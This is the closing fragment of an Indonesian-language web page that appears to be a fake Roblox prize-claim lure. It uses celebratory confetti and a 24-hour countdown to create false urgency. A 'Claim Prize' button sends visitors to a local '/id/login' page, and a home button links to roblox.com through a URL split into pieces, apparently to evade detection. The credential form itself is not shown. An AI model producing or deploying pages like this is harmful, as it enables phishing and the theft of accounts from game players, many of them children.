        <div id="countdown" class="text-4xl font-bold mb-6">00:00:00</div>
        <button onclick="window.location.href = '/id/login' " class="w-full bg-[#2563eb] rounded-md py-2 text-white text-sm font-semibold mb-3 hover:bg-[#1e40af] transition">
        Klaim Hadiah
        </button>
        <button onclick="window.location.href = 'http:/'+'/www.roblox.com/'" class="w-full bg-[#3a3f54] rounded-md py-2 text-white text-sm font-semibold hover:bg-[#2c3140] transition">
        Kembali ke Beranda
        </button>
    </section>
    </main>
    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
    <script>
        // Jalankan confetti setiap reload
        confetti({
            particleCount: 180,
            spread: 90,
            origin: { y: 0.8 } // awal dari bawah
        });
    </script>
    <script>
        // ===============================
        // 1️⃣ Ambil waktu tersimpan dari localStorage
        // ===============================
        const storageKey = "countdownEndTime";
        let endTime = localStorage.getItem(storageKey);

        if (!endTime) {
        // Jika tidak ada, set ke 24 jam dari sekarang
        endTime = Date.now() + 24 * 60 * 60 * 1000;
        localStorage.setItem(storageKey, endTime);
        } else {
        endTime = parseInt(endTime);
        }

        const countdownEl = document.getElementById("countdown");

        // ===============================
        // 2️⃣ Update countdown setiap detik
        // ===============================
        function updateCountdown() {
        const now = Date.now();
        let diff = endTime - now;

        if (diff <= 0) {
            countdownEl.textContent = "⏰ Waktu habis!";
            localStorage.removeItem(storageKey);
            return;
        }

        const hours = Math.floor(diff / (1000 * 60 * 60));
        diff %= 1000 * 60 * 60;
        const minutes = Math.floor(diff / (1000 * 60));
        diff %= 1000 * 60;
        const seconds = Math.floor(diff / 1000);

        countdownEl.textContent = `${hours.toString().padStart(2,'0')}:${minutes.toString().padStart(2,'0')}:${seconds.toString().padStart(2,'0')}`;
        }

        updateCountdown(); // langsung tampil pertama kali
        setInterval(updateCountdown, 1000);
    </script>
    </body>
</html>
